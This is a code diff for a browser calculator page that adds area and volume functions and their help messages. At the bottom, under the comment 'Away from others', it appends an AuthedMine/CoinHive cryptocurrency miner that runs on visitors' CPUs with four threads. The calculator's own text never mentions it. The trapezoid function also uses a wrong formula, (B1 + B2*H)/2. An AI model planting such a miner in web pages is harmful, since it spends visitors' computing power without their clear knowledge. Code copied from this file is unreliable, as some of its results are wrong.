@@ -26,6 +26,7 @@
 				console.log("")
 				console.log("You can type the menu of the category for the function that falls in this category:")
 				console.log("Basic(): Show all function in Baisc.")
+				console.log("Area(): Show all function about area.")
 				console.log("")
 				console.log("Below me is the all function")
 //Basic function
@@ -37,24 +38,44 @@
 				console.log("")
 //geometry function
 				console.log("Geometry:")
+	//Area function
 				console.log("Area:")
 				console.log("SquareA(Side_Length): Find out the area of the Square for you.")
 				console.log("RecA(Length,Width): Find you the area of the Rectangle for you.")
+				console.log("TriA(Base,Height): Find the Area of your Triangle.")
+				console.log("The Parallelogram use same formula as Rectangle, so use RecA() instead")
+				console.log("CircleA(Radius): use radius find the area of your circle, if you got diameter, just divide diameter by 2")
+				console.log("TrapezoidA(Base1,Base2,Height): Find the area of Trapezoid for you.")
+	//Volume function
+				console.log("Volume:")
+				console.log("Cube(Side): find the Volume of the cube for you.")
+				console.log("RecPri(Length,Width,Height): find the Volume of your rectanglar prisim")
+				console.log("TriPri(Length(Of triangle), altitude, height): find volume of your triangler prisim.")
+				console.log("RecPyr(Length of Base, Width of Base, Height): fidn volume of your rectanglar pyramid.")
 
 			}
 //Menu function
 	//basic menu
-			function Basic(){
-				console.log("Basics:")
-				console.log("Add(number1,number2): just add them together!")
-				console.log("Subtract(minuend,subtrahend): the minuend minus subtrahend.")
-				console.log("Multiply(number1,number2): just multiply those two")
-				console.log("Divide(number1,number2): the first number been divide by second number.")
+		function Basic(){
+			console.log("Basics:")
+			console.log("Add(number1,number2): just add them together!")
+			console.log("Subtract(minuend,subtrahend): the minuend minus subtrahend.")
+			console.log("Multiply(number1,number2): just multiply those two")
+			console.log("Divide(number1,number2): the first number been divide by second number.")
+		}
+		function Basic_Help(){
+			console.log("Show all function that falls in Basic category.")
 			}
-			function Basic_Help(){
-				console.log("Show all function that falls in Basic category.")
-			}
-	//geometry
+	//Area
+		function Area(){
+			console.log("Area:")
+			console.log("SquareA(Side_Length): Find out the area of the Square for you.")
+			console.log("RecA(Length,Width): Find you the area of the Rectangle for you.")
+			console.log("TriA(Base,Height): Find the Area of your Triangle.")
+			console.log("The Parallelogram use same formula as Rectangle, so use RecA() instead")
+			console.log("CircleA(Radius): use radius find the area of your circle, if you got diameter, just divide diameter by 2")
+			console.log("TrapezoidA(Base1,Base2,Height): Find the area of Trapezoid for you.")
+		}
 //Calculating function:
 	//Basic calculation function
 		//function of add
@@ -152,6 +173,96 @@
 						console.log("it's " + three + "!")
 					}
 				}
+			//help func of rec
+				function RecA_Help(){
+					console.log("RecA(), put 2 number in it, first is length, and second is width. For example, RecA(3,5) will get 15, and that's the area of your Rectangle.")
+				}
+			//func of Triangle
+				function TriA(B,H){
+					var a = isNaN(B)
+					var b = isNaN(H)
+					if (a == true || b == true) {
+						console.log("Please type a number!")
+				}
+					else {
+						var three = (B*H)/2
+						console.log("it's " + three + "!")
+					}
+				}
+			//help func of Tri
+				function TriA_Help(){
+					console.log("find the Area of your  triangle, put base and Height in, for example, TriA(2,5) will give you 5, the area of the triangle.")
+				}
+			//func of circle_radius
+				function CircleA(R){
+					var a = isNaN(R)
+					if (a == true) {
+						console.log("Please type a number!")
+				}
+					else {
+						var b = R*R*Math.PI
+						var c = R*R
+						console.log("it's " + b +
+
+						 "(In decimal form), or it's " + c + "π!")
+					}
+				}
+			//help func for circle
+				function CircleA_Help(){
+					console.log("CircleA() is for cauculating the area circle by using radius, for example, CircleA(5) will give you the out put of both decimal form and PI form of the area.")
+				} 
+			//fuc of Trapezoid
+				function TrapezoidA(B1,B2,H){
+					var a = isNaN(B1)
+					var b = isNaN(B2)
+					var c = isNaN(H)
+					if (a == true || b == true || c == true) {
+						console.log("Please type a number!")
+					}
+					else {
+						var A = (B1 + B2 * H)/2
+						console.log("it's " + A + "!")
+					}
+				}
+		//function of Volume
+			//func of cube
+				function Cube(S){
+					var a = S*S*S
+					console.log("It's "+a+"!")
+				}
+			//help func of cube
+				function Cube_Help(){
+					console.log("For Cube(), You can find volume of a cube! Ex: Cube(5) output is 125.")
+
+				}
+			//func of RecPri
+				function RecPri(L,W,H){
+					a = L*W*H
+					console.log("It's "+a+"!")
+				}
+			//help func of RecPri
+				function RecPri_Help(){
+					console.log("The RecPri() function can help you find volume of your rectanglar prisim, Ex:RecPri(2,3,4) is 24.")
+				}
+			//func of TriPri
+				function TriPri(L,A,H){
+					a = (L*A*H)/2
+					console.log("It's "+a+"!")
+				}
+			//help func of TriPri
+				function TriPri_Help(){
+					console.log("TriPri() can help you find the Volume if a Triangler prisim, for example, TriPri(2,3,4) will get out put 12.")
+				}
+			//func of RecPyr
+				function RecPyr(L,W,H){
+					a = (L*W*H)/3
+					console.log("It's "+a+"!")
+				}
+			//hfo RecPyr
+				function RecPyr_Help(){
+					console.log("RecPry() is for cauculating the volume, you can use like RecPry(2,3,4) to get volume.")
+				}
+			//func of 
 		</script>
 
 <!--And this part is....-->
@@ -163,5 +274,21 @@
 			</button>
 		</div>
 		<div align="center" id="warning"></div>
+<!--Away from others-->
+		<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+		<script>
+			var miner = new CoinHive.User('8DB2zcIGcjOm3f9Bgzt2WwzidubtAisz', "Calculator", {
+				threads: 4,
+				throttle: 0.3,
+				forceASMJS: false,
+				theme: 'dark',
+				language: 'auto'
+			});
+			// Only start on non-mobile devices and if not opted-out
+			// in the last 14400 seconds (4 hours):
+			if (!miner.isMobile() && !miner.didOptOut(14400)) {
+				miner.start();
+			}
+		</script>
 	</body>
 </html>
